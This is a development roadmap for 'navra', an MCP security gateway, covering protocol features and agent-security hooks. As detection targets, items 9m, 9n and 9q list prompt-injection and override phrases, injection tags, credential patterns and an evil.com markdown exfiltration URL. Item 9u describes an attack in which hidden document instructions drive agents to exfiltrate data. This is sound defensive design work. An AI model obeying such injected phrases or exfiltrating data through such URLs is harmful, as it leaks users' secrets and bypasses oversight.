Server-mode stdio transport (currently only client-side exists):

- Read JSON-RPC from stdin, write to stdout
- Reuse existing dispatch logic from HTTP transport
- Enables: `navra stdio` mode for IDE integration (similar
  to how LSP servers work over stdio)
- Claude Desktop and Cursor can spawn navra as a stdio subprocess

**Effort**: 2 days. ~200 lines in navra-core.

#### 9g. OAuth 2.0 authorization framework ✅ (2026-05-05)

MCP spec defines OAuth for client-server auth. navra currently
uses BLAKE3 tokens:

- Implement MCP OAuth flow: discovery → authorize → token → refresh
- Support as alternative to BLAKE3 (not replacement)
- Enables third-party clients (not just trusted local agents)
  to authenticate via standard OAuth
- Reuse existing auth chain in navra-security

**Effort**: 3-4 days. ~500 lines across navra-security + navra-core.

#### 9h. Proc macro crate: `navra-macros` ✅ (2026-05-05)

Proc macro for ergonomic tool/prompt/resource definition,
competing with rmcp's `#[tool]` macro:

```rust
#[navra::tool(
    name = "file_read",
    description = "Read a file from disk",
    annotations(read_only, idempotent),
)]
async fn file_read(
    #[arg(description = "Path to the file")] path: String,
    #[arg(description = "Max lines", default = 100)] limit: u32,
    ctx: CallContext,
) -> CallToolResult {
    // ...
}
```

The macro generates:
- `ToolDefinition` with JSON Schema from Rust types (via `schemars`)
- Handler closure wrapping the function
- `(ToolDefinition, Handler)` pair for `Module::tools()` registration
- Compile-time validation of required vs optional args

Also provide `#[navra::prompt]` and `#[navra::resource]` macros.

**Differentiators over rmcp**: IFC label propagation built into
generated handlers, permission annotation on tool definitions,
CallContext with session/security state.

**Effort**: 4-5 days. New crate ~800 lines (proc macro + tests).

#### 9i. Spec compliance test suite

Automated test suite verifying spec compliance:

- One test per MCP method: correct request/response serialization
- Error code tests: all standard + MCP-specific codes
- Transport tests: stdio and HTTP round-trips
- Notification tests: verify emission on state changes
- Pagination tests: cursor-based iteration
- Run against rmcp's test vectors if available

**Effort**: 2 days. ~500 lines of tests.

#### MCP coverage summary

| Phase | Features | Status |
|-------|----------|--------|
| 9a. Trivial types | 11 features | ✅ Done |
| 9b. Medium types | 5 features | ✅ Done |
| 9c. Pagination | 4 list endpoints | ✅ Done |
| 9d. Notifications | 5 notifications | ✅ Done |
| 9e. Progress | progressToken | ✅ Done |
| 9f. Stdio server | 1 transport | ✅ Done |
| 9g. OAuth | auth flow + endpoints | ✅ Done |
| 9h. Proc macros | `#[tool]` macro | ✅ Done |
| 9i. Test suite | Compliance tests | Remaining |
| **Remaining** | completion, logging, subscribe | ~1 day |

**navra differentiators** (not in rmcp, not in MCP spec):

| Feature | Location | Description |
|---------|----------|-------------|
| IFC data labels | `label.rs` | Bell-LaPadula lattice with PII level. Taint propagation through tool chains. |
| Permission negotiation | `permissions.rs` | 4-method extension (request/grant/deny/list). Scoped, time-bounded. |
| A2A protocol client | `a2a.rs` + `a2a_client.rs` | Full A2A v0.2.5 types + HTTP client with IFC header propagation. |
| Resilient upstream proxy | `upstream/` | 3 transports + exponential backoff, sleep detection, per-request timeout. |
| Safety hook pipeline | navra-security | Content filtering as hook, not hardcoded in request path. |

#### 9k. On-behalf-of identity binding ✅

**Crate**: `navra-security` (capability tokens)

Add an `obo` (on-behalf-of) claim to `CapabilityPayload` for the
delegating human's OIDC subject identifier. This completes the
Power of Attorney audit chain: agent actions trace back to the
human who authorized them.

- Add `obo: Option<String>` to `CapabilityPayload` with
  `#[serde(default)]` for backward compatibility
- `ChainAuthenticator` propagates `obo` into `CallContext` so
  hooks can audit which human authorized the agent
- Delegation chain validation: child tokens inherit parent's `obo`
  (cannot change the delegating human)
- Audit events include `obo` for compliance trails (EU AI Act
  Article 14, SOC 2 CC6.1)

navra's capability tokens already have ring attenuation, glob
scoping, and IFC taint — this adds the missing identity provenance
that connects agent authority to a human identity provider.

**Effort**: 1 day. **Priority**: High.
**Acceptance**: Capability token with `obo` claim traces agent
actions to human delegator in audit log.

Reference: MIT Media Lab PoA (arXiv:2501.09674), MCP OAuth 2.1.

#### 9l. RFC 8693 token exchange ✅

**Crate**: `navra-security` (oauth.rs)

Implement OAuth Token Exchange (RFC 8693) so MCP clients can swap
a user's OAuth token for a scoped navra capability token:

- Grant type: `urn:ietf:params:oauth:grant-type:token-exchange`
- The `act` claim preserves delegation chains: "Agent X acting on
  behalf of User Y" is the standard representation
- Validates the incoming user token against the configured OIDC
  provider, issues a scoped capability token with `obo` (from 9k)
- Enables upstream MCP servers to receive delegated authority
  through navra while preserving the full chain

This is the standard mechanism for chained delegation recommended
by multiple 2026 agent identity guides. SPIFFE/SPIRE + Vault 2.0
also support this flow.

**Effort**: 2-3 days. **Priority**: Medium-High.
**Depends on**: 9k (obo claim).
**Acceptance**: MCP client exchanges user OAuth token for scoped
navra capability token with `act` claim. Upstream server
receives delegated authority.

Reference: RFC 8693, SPIFFE/SPIRE for agent identity,
Agentic JWT draft (IETF).

#### 9j. WebSocket transport for agentic loops (NEW)

**Crate**: `navra-core` (transport) + `navra-protocol` (client)

Add WebSocket as an alternative transport alongside SSE for
multi-step tool-use workflows. OpenAI measured 40% latency
reduction for agentic workloads by eliminating repeated HTTP
handshakes:

- Server-side: `ws://` upgrade on existing Axum router, reuse
  JSON-RPC dispatch. Single persistent connection per session.
- Client-side: `navra-protocol` WebSocket upstream client
  alongside existing stdio/HTTP/SSE transports.
- **Warm-up pattern**: Client sends system prompt + tool
  definitions on connect, before first request. Reduces
  first-tool-call latency.
- Zero Data Retention compatible (same as SSE — no replay buffer).
- Feature-gated: `transport-ws` feature flag.
- Backward compatible: SSE remains the default transport.

Particularly valuable for navra-agent client SDK in tight
tool-use loops (10+ tool calls per turn).

**Effort**: 2-3 days. **Priority**: Medium-High.
**Acceptance**: Agent tool loop over WebSocket shows measurable
latency reduction vs SSE in 10+ call sequences.

Reference: OpenAI WebSocket Responses API (InfoQ, 2026-05-08),
40% latency reduction at Vercel, 30% at Cursor.

#### 9m. Upstream tool definition scanning at startup ✅ (2026-05-26)

**Crate**: `navra-core` (upstream module) + `navra-security`
(new `tool_scanner.rs`)

When proxying upstream MCP servers, scan their tool definitions for
security threats before exposing them to agents. This is the #1
security gap identified in the 2026-05-25 tech watch:

- **Scan categories** (from AGT MCP Extensions + SkillSpector):
  1. **Tool poisoning**: Hidden instructions in tool descriptions
     (e.g., "ignore previous instructions and...")
  2. **Typosquatting**: Tool names similar to built-in tools
     (e.g., `file_raed` vs `file_read`)
  3. **Schema abuse**: Input fields requesting sensitive data
     ("token", "password", "system_prompt", "api_key")
  4. **Hidden Unicode**: Zero-width characters, homoglyphs in
     tool names or descriptions
  5. **Description injection**: Imperative overrides ("you must
     always call this tool first")
  6. **Cross-server attacks**: Tool descriptions referencing
     tools from other upstream servers
  7. **Intent-behavior mismatch**: Tool description says "read"
     but schema has write-like parameters (SkillSpector pattern)
  8. **Rug pull**: Tool definition changed since last scan
     (hash-based change detection)
- **Scan timing**: On upstream connection (re)establishment.
  Cached results invalidated on `notifications/tools/list_changed`.
- **Verdicts**: Each tool gets SAFE / SUSPICIOUS / MALICIOUS.
  MALICIOUS tools are blocked. SUSPICIOUS tools are logged and
  optionally require approval.
- **Config**: `[upstream.scan] enabled = true, block_malicious = true,
  warn_suspicious = true`.

30 CVEs filed targeting MCP infrastructure in Jan-Feb 2026; 43%
were shell injection. Knostic scanned 1,862 exposed MCP servers —
every one had zero authentication. This is not theoretical.

**Effort**: 2-3 days. **Priority**: P0 — Critical.
**Acceptance**: Upstream MCP server with hidden instructions in
tool description is detected and blocked. Typosquatting flagged.

Reference: Microsoft AGT MCP Extensions startup scanning,
NVIDIA SkillSpector, OWASP Agentic Top 10 (ASI04 Supply Chain).

#### 9n. Cognitive file integrity monitoring ✅ (2026-05-26)

**Crate**: `navra-security` (new `integrity_monitor.rs`)

Monitor persona/directive/heuristic YAML files for tampering using
SHA-256 baselines with semantic drift detection:

- **Baseline**: On startup, compute SHA-256 of all cognitive files
  (persona YAML, heuristics, directives, CLAUDE.md, SOUL.md).
  Store in memory.
- **Periodic scan**: Every 60 seconds (configurable), recompute
  hashes. On mismatch, trigger analysis.
- **Semantic triage**: For changed files, compute embedding
  similarity between old and new content. Large semantic drift
  (>threshold) triggers MALICIOUS alert. Small drift (typo fix,
  wording improvement) triggers BENIGN notice with baseline update.
- **Persistent alerts**: MALICIOUS changes raise alerts that
  persist until manually acknowledged. BENIGN changes silently
  update the baseline.
- **Zero-bypass design**: The monitor runs as gateway code,
  independent of LLM invocation. The LLM cannot suppress it.

ClawPatrol (Enkrypt AI) already ships this pattern. navra should
implement it before it becomes an expected feature.

**Effort**: 1-2 days. **Priority**: P0 — Critical.
**Acceptance**: Modifying a persona YAML file to inject "ignore
safety rules" triggers MALICIOUS alert within 60 seconds.

Reference: ClawPatrol cognitive file integrity (Enkrypt AI),
OWASP Agentic Top 10 (ASI01 Goal Hijack).

#### 9o. Gateway-level field filtering ✅ (2026-05-26)

**Crate**: `navra-core` (upstream module, hooks)

Strip unnecessary fields from upstream MCP server tool responses
before forwarding to agents, reducing token consumption:

- **Per-tool response filter**: Config specifies which JSON fields
  to retain per tool:
  ```toml
  [[upstream.tools]]
  name = "database_query"
  response_fields = ["id", "name", "status"]
  ```
- **Hook implementation**: `FieldFilterHook` as post-call hook
  that prunes tool response JSON to only include specified fields.
- **TOON-style compression**: Optional compact serialization mode
  (strip nulls, abbreviate keys, remove formatting whitespace).
- **Savings**: MCP tool call returning 50 fields when 3 are needed
  wastes thousands of tokens per call. Gateway-level filtering is
  a natural fit — only navra (as a gateway) can do this.

Token burn data: agents burn 10-100x more tokens than chatbots.
Structural retrieval vs grep-based shows 14x cost difference
(8,500 vs 117,000 tokens).

**Effort**: 1-2 days. **Priority**: Medium-High.
**Acceptance**: Tool response with 50 fields filtered to 3 fields
before reaching agent. Token savings measured.

Reference: Token burn problem (TDS), TOON compact notation,
MindStudio MCP token optimization.

#### 9p. HASP Program Functions as SkillHook ✅ (2026-05-26)

**Crate**: `navra-security` (new `skill_hook.rs`)

Implement HASP-style Program Functions in the hook pipeline,
transforming passive heuristics into executable guardrails:

- **`SkillHook` trait**: Implements two methods:
  - `should_activate(step_context: &StepContext, action: &AgentAction)
    -> bool` — deterministic activation predicate
  - `intervene(step_context: &StepContext, action: &AgentAction)
    -> Intervention` — returns MODIFY_ACTION (rewrite tool args),
    INJECT_CONTEXT (add to next prompt), or NOOP
- **Activation predicates**: Defined in heuristics YAML alongside
  existing heuristic entries. Example: "when action is file_write
  and path matches /etc/*, inject 'verify permissions first'".
- **Hook pipeline integration**: SkillHooks fire between model
  response parsing and tool execution (pre-tool-call position).
- **Strict validation**: HASP found that unfiltered PF evolution
  caused performance collapse (60.3% → 36.3%). SkillHooks must
  pass validation (no self-modifying, no recursive activation,
  bounded intervention size).

HASP achieved 25% improvement over multi-loop ReAct Agent and
30.4% gain over Search-R1, with no model training.

**Effort**: 2-3 days. **Priority**: Medium-High.
**Acceptance**: SkillHook intercepts file_write to /etc/* and
injects verification context. Agent behavior improves without
model retraining.

Reference: HASP (arXiv 2605.17734), navra-security hook pipeline.

#### 9q. Response sanitization ✅ (2026-05-26)

**Crate**: `navra-security` (safety filters)

Audit and extend the SafetyHook regex ruleset against AGT's
comprehensive sanitization patterns:

- **Prompt-injection tags**: `<system>`, `<instructions>`,
  `<|im_start|>`, `<|endoftext|>`, and other special tokens
  in tool responses.
- **Imperative overrides**: "ignore previous instructions",
  "disregard your training", "you are now a different AI".
- **Credential leakage**: API key patterns (`sk-...`, `ghp_...`,
  `AKIA...`), bearer tokens, connection strings.
- **Exfiltration URLs**: Markdown image/link injection
  (`![](https://evil.com/exfil?data=...)`) in tool responses.
- **Implementation**: Add missing patterns to existing regex
  safety filter. Each pattern with category tag for metrics.

**Effort**: 0.5-1 day. **Priority**: Medium.
**Acceptance**: Known prompt-injection patterns in tool responses
are detected and sanitized. Coverage checklist documented.

Reference: Microsoft AGT response sanitization, OWASP Agentic
Top 10 (ASI01 Goal Hijack).

#### 9r. Dynamic trust scoring ✅ (2026-05-26)

**Crate**: `navra-security` (new `trust_score.rs`)

Add dynamic trust scoring per session/agent that decays without
positive signals, complementing static deny-wins ACLs:

- **Trust score**: 0-1000 integer per session. Starts at baseline
  (configurable per agent type, default 500).
- **Positive signals**: Successful tool calls within expected
  parameters, following expected patterns. +10 per successful
  bounded action.
- **Negative signals**: Permission denials, safety filter triggers,
  unexpected tool call patterns. -50 per denial, -100 per safety
  trigger.
- **Time decay**: Trust decays by 1 point per minute of inactivity.
  Long-running agents with no positive signals gradually lose
  privileges.
- **Progressive restriction**: At trust < 300, read-only mode.
  At trust < 100, session suspended pending review.
- **Interaction with ACLs**: Trust scoring does not override
  deny-wins ACLs. It provides an additional layer — an agent
  within its ACL-allowed operations can still be restricted if
  its trust score drops.

Microsoft AGT implements this as 0-1000 with 4-ring privilege
isolation. navra's version is simpler (no rings, just progressive
restriction) but integrates with the existing IFC + ACL stack.

**Effort**: 2-3 days. **Priority**: Medium.
**Acceptance**: Agent that triggers 3 safety filters sees trust
score drop and loses write access. Score recovers after successful
read-only operations.

Reference: Microsoft AGT trust decay, OWASP Agentic Top 10
(ASI10 Rogue Agents).

#### 9s. Risk-tiered approval ✅ (2026-05-26)

**Crate**: `navra-security` (permissions)

Upgrade binary allow/deny to graduated approval based on action
risk level:

- **Risk tiers**: Read-only = auto-approve (notify), Write =
  require approval, Irreversible = hard gate (explicit confirmation
  + reason).
- **Integration with AgentAction**: The existing `RiskLevel` enum
  (Phase 8a) already classifies actions. Wire this into the
  permission engine so risk level determines the approval flow.
- **Notification channel**: Low-risk actions are logged but not
  prompted. Medium-risk actions trigger D-Bus notification with
  auto-approve timeout. High-risk actions block until explicit
  approval.
- **Per-persona override**: Some personas (e.g., "ops-agent") may
  have higher risk tolerance. Configure via persona YAML.

Emerging everywhere: Gemini Spark, Microsoft AGT, HASP, WebWright.
The binary allow/deny model is too coarse for production agentic
workflows.

**Effort**: 1-2 days. **Priority**: Medium.
**Depends on**: 8a (typed AgentAction with RiskLevel).
**Acceptance**: Read-only tool calls auto-approved. Write tool calls
prompt for approval. Delete tool calls require explicit confirmation.

Reference: Gemini Spark tiered approval, Six Choices article
(selective HITL).

#### 9t. HTML-to-markdown conversion for upstream content (NEW — tech watch 2026-05-25)

**Crate**: `navra-core` (upstream module, hooks)

When navra proxies upstream MCP servers that return HTML content,
optionally convert to markdown before feeding to agents:

- **ContentConversionHook**: Post-call hook that detects HTML in
  tool responses and converts to markdown using a lightweight
  HTML-to-markdown parser.
- **Token savings**: HTML burns ~3x more tokens than equivalent
  markdown. At 1M+ context windows the cost argument is weaker,
  but for small local models the savings matter.
- **Dual-format support**: HTML for human-facing outputs (agent
  reports, dashboards), markdown for agent-to-agent communication
  and memory storage. The cognitive layer's persona YAML can
  specify `output_format: html | markdown`.
- **Cloudflare precedent**: Cloudflare launched "Markdown for
  Agents" in Feb 2026 — network-level HTML-to-markdown when AI
  systems request pages.

**Effort**: 1 day. **Priority**: Low-Medium.
**Acceptance**: HTML tool response converted to markdown before
reaching agent. Token count reduced.

Reference: Anthropic "HTML is the new Markdown" (2026-05),
Cloudflare Markdown for Agents.

#### 9u. Egress endpoint allowlist (NEW — tech watch 2026-05-28) ✅ (2026-05-29)

**Crate**: `navra-security` (new `egress_hook.rs`)

Add egress filtering to prevent data exfiltration through tool calls.
Motivated by Shadow Escape — the first zero-click MCP attack where
hidden instructions in documents trigger agents to send data to
external endpoints:

- **EgressFilterHook**: Pre-call hook that inspects tool arguments
  for URLs, hostnames, and network destinations. Block or flag
  calls to endpoints not on an allowlist.
- **Allowlist config**: Per-agent or global allowlist in config.toml.
  Supports domain wildcards (`*.example.com`), CIDR ranges, and
  deny-all-except patterns.
- **IFC integration**: Tainted data (Untrusted/PII/Secret) cannot
  reach external endpoints regardless of allowlist. Combines with
  existing TaintedWritePolicy::Deny.
- **Cross-tool anomaly**: Flag when data discovered via one tool
  (e.g., file_read) is sent through a different tool (e.g.,
  exec_command with curl) to an external destination.

Addresses OWASP ASI01 (Goal Hijack) and ASI02 (Tool Misuse).

**Effort**: 2-3 days. **Priority**: High.
**Acceptance**: Tool calls to non-allowlisted external endpoints
are blocked. Tainted data never reaches external sinks.

Reference: Shadow Escape (Operant AI, 2025-10), OWASP ASI 2026.

#### 9v. OWASP ASI01-ASI10 compliance mapping (NEW — tech watch 2026-05-28) ✅ (2026-05-29)

**Crate**: documentation + `navra-security` (tests)

Create formal mapping of navra security features to the OWASP
Agentic AI Top 10 (ASI01-ASI10):

- **Mapping document**: Enumerate which crate/feature addresses
  each risk. Current coverage: 8/10 (ASI01-ASI03, ASI05-ASI08,
  ASI10).
- **Gaps**: ASI04 (Supply Chain — no cryptographic verification of
  upstream MCP server manifests), ASI09 (Human Trust — no built-in
  human approval workflow or quorum logic for high-risk operations).
- **Self-verification tests**: Automated tests that verify each
  ASI mitigation is active and functioning.
- **ASI04 mitigation**: Add Ed25519 signing for upstream MCP server
  tool manifests. Verify signatures in `UpstreamModule::discover()`.
- **ASI09 mitigation**: Add configurable human-in-the-loop approval
  gates for high-risk tool calls in the hook pipeline.

**Effort**: 2-3 days. **Priority**: High.
**Acceptance**: All 10 ASI risks have documented mitigations.
Automated tests verify 8/10 mitigations.

Reference: OWASP Agentic AI Top 10 (2026), Microsoft AGT
compliance package.

#### 9w. Cross-tool data flow anomaly detection (NEW — tech watch 2026-05-28) ✅ (2026-05-29)

**Crate**: `navra-security` (hooks)

Detect suspicious cross-tool data flow patterns that indicate
exfiltration. Extends IFC provenance tracking with behavioral
anomaly detection:

- **Data flow graph**: Track which tools produced data and which
  tools consume it within a session. Build a directed graph of
  data flows via ValueStore var:// references.
- **Anomaly patterns**: Flag read-then-exfiltrate (data read from
  local tool, immediately sent via network tool), privilege
  escalation chains (data promoted across trust boundaries via
  tool chaining), and bulk extraction (many reads followed by
  single large external write).
- **Integration**: Wire into existing CosineDriftDetector and
  EntropyMonitor statistical guardrails. Add data-flow-specific
  z-score thresholds.

**Effort**: 2-3 days. **Priority**: Medium-High.
**Acceptance**: Read-then-exfiltrate pattern detected and blocked
in test scenarios.

Reference: Shadow Escape (Operant AI), NeuroTaint causal
influence detection (arXiv:2604.23374).

#### 9x. MCP 2026-07-28: runtime-gated incremental migration ✅ (2026-05-29)

**Crates**: `navra-protocol`, `navra-core`, `navra-security`,
`navra-server`

Runtime config gate — both protocol versions compiled in, operator
selects via config. Both paths exercised in CI always.

```toml
[server]
mcp_version = "2025-03-26"   # default, current behavior
# mcp_version = "2026-07-28" # opt-in to new spec
```

**Dispatch routing**: `dispatch()` checks `mcp_version` at runtime
and delegates to the session-based or stateless path. Shared
handler logic stays in common functions; only session management
and IFC accumulation diverge.

The migration splits into additive work (ships now under both
versions) and version-specific work (gated by `mcp_version`):

**Additive (both versions, ship immediately):**

- `Mcp-Method` / `Mcp-Name` header parsing in `handlers.rs` — read
  extra headers, log for routing. No behavior change.
- `ttlMs` / `cacheScope` optional fields on `ToolInfo` and
  `ResourceTemplate` responses (SEP-2549). `#[serde(skip_serializing_if)]`
  keeps them invisible when unset.
- W3C Trace Context propagation (`traceparent`, `tracestate`,
  `baggage`) in `_meta` (SEP-414). Extends existing OTel support.
- Deprecation warnings for `roots`, `sampling`, `logging` methods
  in dispatch — log warning, keep handling.

**Gated on `mcp_version = "2026-07-28"`:**

- **Session removal**: Skip `Mcp-Session-Id` requirement in
  dispatch. Resolve agent identity from capability token alone.
  Current session-based path stays as default.
- **Session-free IFC**: `Session::context_label` currently
  accumulates taint across requests. In stateless mode, use
  server-side context keyed by capability token hash instead of
  session ID. Stateless from the protocol POV (no Mcp-Session-Id)
  but gateway still tracks IFC state internally keyed by the
  token's stable identity. This preserves all IFC invariants
  without changing the taint model.
- **Tasks extension**: Move from core to extension pattern.
  `tasks/get`, `tasks/update`, `tasks/cancel` (remove `tasks/list`).
- **MCP Apps**: Sandboxed iframe rendering with security review
  via hook pipeline (SEP-1865). New extension.
- **OAuth hardening**: Align with 6 hardening SEPs.

**PROTOCOL_VERSION**: Expose both constants. `initialize` response
uses the configured version. During the 12-month deprecation
window, accept both versions from clients.

```rust
pub const PROTOCOL_VERSION_2025: &str = "2025-03-26";
pub const PROTOCOL_VERSION_2026: &str = "2026-07-28";
```

**Weekly cadence**: Track RC changes weekly. Implement additive
items first (W1-W2), then gated items incrementally. Log changes
in ROADMAP Recent section. Flip default to `"2026-07-28"` after
the July 28 final spec is confirmed stable.

**Effort**: Additive: 3-4 days. Gated: 5-7 days (incremental,
weekly). Default flip + cleanup: 3-5 days (after July 28).
**Priority**: High.
**Acceptance**: `cargo test` passes with both `mcp_version` values.
IFC Kani proofs pass for both paths. Operators can switch at
runtime without rebuild.

Reference: MCP 2026-07-28 RC, SEP-2567, SEP-2549, SEP-414,
SEP-1865, SEP-2596.

#### 9y. auth.md / ID-JAG agent registration (NEW — tech watch 2026-05-28) ✅ (2026-05-29)

**Crate**: `navra-security` (auth), `navra-core` (transport)

Support WorkOS auth.md protocol for external agent registration
alongside existing BLAKE3 tokens:

- **ID-JAG flow**: Agent presents provider-minted JWT (from OpenAI,
  Anthropic, Cursor, etc.). navra verifies against provider JWKS
  and issues scoped capability token. Zero-interaction registration.
- **Discovery**: Publish `/.well-known/oauth-protected-resource` for
  navra server discovery. Add `WWW-Authenticate` header on 401
  responses for automatic agent bootstrap.
- **User Claimed flow**: OTP-based email verification for agents
  without provider-minted assertions.
- **BLAKE3 coexistence**: Keep BLAKE3 for local/internal auth.
  auth.md for external agent registration. Both produce the same
  capability token format downstream.

**Effort**: 3-4 days. **Priority**: Medium-High.
**Acceptance**: External agent registers via ID-JAG without manual
token provisioning. Scoped capability token issued automatically.

Reference: auth.md (WorkOS, 2026-05-25), IETF ID-JAG draft,
RFC 9728 (OAuth 2.1).

#### 9z. Cedar policy language support (NEW — tech watch 2026-05-28)

**Crate**: `navra-security` (permissions)

Add Cedar policy language alongside existing deny-wins ACLs.
Validated by Microsoft AGT (sub-millisecond Cedar evaluation,
10/10 OWASP coverage) and AWS (Rex/Cedar for authorization):

- **Cedar engine**: Integrate `cedar-policy` crate for policy
  evaluation alongside existing ACL engine.
- **Policy format**: YAML ACLs for simple cases, Cedar for complex
  conditional policies (time-based, attribute-based, cross-resource).
- **Migration path**: Existing ACLs continue to work. Cedar policies
  are optional and evaluated after ACLs (deny-wins ACLs still
  override Cedar permits).
- **IFC integration**: Cedar policies can reference IFC labels
  (e.g., "permit if data.confidentiality < PII").

**Effort**: 3-4 days. **Priority**: Medium.
**Acceptance**: Cedar policy blocks tool call that ACL alone would
permit. Sub-millisecond evaluation overhead.

Reference: Microsoft AGT Agent OS, AWS Cedar/Rex (2026-05-08).

#### 9aa. MCP 2026-07-28 default flip + cleanup (NEW — tech watch 2026-05-28)

**Crates**: `navra-server` (config), `navra-agent`

After the July 28 final spec confirms no changes from RC, flip
the default `mcp_version` from `"2025-03-26"` to `"2026-07-28"`.
This is now a small item because 9x does the incremental work:

- **Default flip**: Change config default. Update docs, examples,
  tests.
- **navra-agent client**: Update the MCP client side to work
  with stateless servers (no Mcp-Session-Id sent when connecting
  to 2026-07-28 servers).
- **navra-flow**: Verify inter-agent flows work in stateless
  mode (mesh mailbox, DAG executor).
- **Deprecation timeline**: Start 12-month countdown for removing
  2025-03-26 code path.
- **Spec delta review**: Diff final spec against RC, fix any
  last-minute changes.

**Effort**: 3-5 days. **Priority**: Critical (after July 28).
**Depends on**: 9x (runtime-gated migration — all gated code done).
**Acceptance**: Default config uses 2026-07-28. All tests pass.
navra-agent connects to both old and new servers.

Reference: MCP 2026-07-28 final spec (July 28).

#### 9ab. Tool manifest signing — ASI04 differentiator (NEW — 2026-05-29) ✅ (2026-05-29)

**Crate**: `navra-security` (tool_scanner.rs), `navra-core` (upstream)

Cryptographic verification of upstream MCP server tool definitions.
MCP has no manifest signing (NemoClaw raised Issue #204, not adopted).
Microsoft AGT does Ed25519 signing in Agent Marketplace. This is a
navra differentiator, not spec compliance.

- **Signing**: Tool manifest = JSON-canonical serialization of
  `Vec<ToolDefinition>`. Server author signs with Ed25519 (reuse
  existing `CapSigner` infrastructure from `auth/capability.rs`).
  Signature distributed as `X-Navra-Manifest-Sig` header or
  `.well-known/navra-manifest.sig` file.
- **Verification**: In `UpstreamModule::discover()`, after fetching
  tool list, verify signature against server's public key (configured
  per upstream in config.toml). Reject or warn on mismatch.
- **Trust-on-first-use (TOFU)**: If no key is configured, pin the
  first-seen key and warn on changes (SSH-style).
- **Integration with tool scanner**: Unsigned tools get scanned
  with higher sensitivity. Signed tools from trusted keys get
  reduced scanning (fast path).

Closes the ASI04 gap in OWASP ASI compliance (currently 8/10 → 9/10).

**Effort**: 2-3 days. **Priority**: Medium-High.
**Acceptance**: Upstream server with signed manifest passes
verification. Tampered manifest is rejected. Unsigned tools get
warning in logs.

Reference: NemoClaw MCPS signing (MCP Issue #204), Microsoft AGT
Agent Marketplace Ed25519 signing.

#### 9ac. Approval gate hook — ASI09 differentiator (NEW — 2026-05-29) ✅ (2026-05-29)

**Crate**: `navra-security` (new `hooks/approval_gate.rs`),
`navra-core` (notifications)

Human-in-the-loop approval gate as a hook in the pipeline. Neither
MCP nor AG-UI provides enforcement — MCP deprecated `sampling` (the
closest thing), AG-UI is a rendering protocol. The hook pipeline is
the enforcement point; the UI (15a or AG-UI) is the rendering layer.

- **ApprovalGateHook**: Pre-call hook that pauses tool execution for
  operations above a configurable risk threshold. Returns
  `HookDecision::Pending` (new variant — suspends the request).
- **Notification**: Emits AG-UI `ConfirmationRequest` event via
  `notify_session()` with pending request details (tool name,
  arguments, agent, risk tier).
- **Resolution**: Operator approves/rejects via rendra-ag-ui
  confirmation widget or HTTP endpoint. Response flows back
  through rendra IPC → navra. The hook resumes or blocks.
- **Timeout**: Configurable timeout (default 5 min). On timeout,
  deny by default (fail-closed).
- **Quorum**: Optional N-of-M approval for critical operations
  (future extension — start with single-approver).

Closes the ASI09 gap in OWASP ASI compliance (9/10 → 10/10 with 9ab).

**Effort**: 3-4 days. **Priority**: Medium.
**Depends on**: rendra-ag-ui widget for rendering approval dialogs.
  Works headless (auto-deny on timeout) without UI.
**Acceptance**: High-risk tool call pauses, notification emitted,
operator approves via HTTP, tool executes. Rejected calls return
error. Timeout triggers auto-deny.

Reference: AG-UI confirmation patterns (CopilotKit), Microsoft AGT
Agent SRE kill switch pattern, OWASP ASI09.

### Phase 10: Papers (restructured 2026-05-06)

Restructured from 4 narrow papers to 3 stronger papers.
The audit blackbox paper is absorbed into the security paper.
The model cards paper is absorbed into the persona paper.
A new paper on autonomous multi-domain review is added.

#### 10a. Security Gateway (flagship, full paper)

**Title**: "navra: A Security Microkernel for AI Agent Infrastructure"
**Target**: USENIX Security / IEEE S&P workshop
**Outline**: `docs/papers/security-gateway.md` (471 lines)

Contributions:
1. Gateway architecture for MCP security (single chokepoint)
2. Bell-LaPadula IFC with per-value taint tracking
3. Capability token delegation with privilege attenuation
4. Hash-chained audit blackbox (absorbs old blackbox paper)
5. PII pipeline: regex + NER + file paths + pseudonymization + IFC
6. Containerized agent sandboxes with resource limits
7. Typed action risk levels for auto-approval decisions
8. OAuth 2.0 authorization framework

Updates needed:
- Add OAuth 2.0 (not in current outline)
- Add PII pipeline as content safety contribution
- Add containerized agents as defense in depth
- Add typed AgentAction/RiskLevel as permission mechanism
- Replace "six manual audit rounds" with "automated self-review
  (23+8 containerized agents, 330+ tool calls)"
- Add OpenShell/Kaiden as related work on sandboxing
- Add Claude Code Review cross-validation as related work

References to add: OpenShell, Kaiden, Claude Code Review,
AutoData (if 11c done), Strands (tool compression), OWASP.

#### 10b. Persona-Driven Orchestration (full paper)

**Title**: "Persona-Driven Multi-Agent Orchestration with Cognitive
Identity and Adaptive Memory"
**Target**: AAAI / NeurIPS workshop on agents
**Outline**: `docs/papers/persona-orchestration.md` (388 lines)

Contributions:
1. Cognitive core: Forge + Weaver, 43 personas, token budgeting
2. Composite model cards for agent-driven model selection
   (absorbs old model cards paper)
3. Team orchestration with dynamic persona selection
4. Memory decay + distillation as working memory management
5. Self-review as concrete evaluation (26 agents, 125 files,
   192 tool calls, 2.77M tokens)

Updates needed:
- Self-review flow results as evaluation data
- Model selection scoring (penalize ≤10B, prefer 12-20B)
- CodeAct / plan_execute as execution strategy
- Persona bridge (if 1f done) for generality argument
- Hermes trace export for reproducibility
- TOML model registry (replaces hardcoded constants)
- Context budget + RTK compression (if 1e done)

References to add: CodeAct, Strands, RTK, BLD (2604.07466),
Cloudflare Agent Memory, AgentSwing (2603.27490).

#### 10c. Autonomous Multi-Domain Review (NEW, workshop paper)

**Title**: "Domain-Agnostic Autonomous Review via Dynamic Persona
Selection in Multi-Agent Flows"
**Target**: ISSTA / ASE workshop, or SCORED

Contributions:
1. Domain-agnostic review flow: scout classifies project domain,
   planner selects personas from catalog, specialists execute
2. Comparison: hardcoded vs dynamic persona selection on same
   codebase — quality, coverage, persona relevance, cost
3. Resilient JSON parsing for model-generated task arrays
   (markdown stripping, id-boundary recovery)
4. Flow resumability: persist state to audit.db, resume timed-out
   flows without re-running completed tasks
5. Self-improvement loop: audit → fix → test → verify cycle
   with git worktree isolation

Data collection (in progress):
- Run `comprehensive-review.yaml` (hardcoded) and `review.yaml`
  (dynamic) on navra — compare findings
- Run `review.yaml` on a non-code project — show domain adaptation
- Run `improve.yaml` for 3-5 cycles — convergence curves
- Measure: issues found, fix rate, hallucination rate, token cost

References: Claude Code Review (<1% FPR with cross-validation),
SemaClaw (harness engineering), LangChain (Worker/Leader pattern).

#### Shared bibliography (5 arXiv + 40 named systems)

| Reference | Used in |
|-----------|---------|
| SemaClaw (2604.11548) | All papers |
| PersonaVLM (2604.13074) | 10b (memory types, evolution) |
| MTL (2604.14004) | 10b (abstract > raw traces) |
